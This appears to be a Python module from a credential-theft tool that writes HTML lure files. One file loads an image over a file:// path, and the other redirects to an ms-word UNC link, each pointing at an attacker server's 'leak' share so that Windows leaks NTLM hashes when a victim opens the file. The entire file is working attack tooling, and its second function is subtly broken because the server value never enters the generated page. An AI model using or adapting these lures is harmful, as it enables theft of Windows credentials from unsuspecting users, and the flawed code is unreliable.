#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_htm(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """<!DOCTYPE html>
<html>
   <img src="file://"""
        + server
        + """/leak/leak.png"/>
</html>"""
    )
    file.close()
    print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")


def create_htm_handler(generate, server, filename):
    file = open(filename, "w")
    file.write("""<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\\\' + server + '\\leak\\leak.docx';

	</script>
</html>""")
    file.close()
    print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
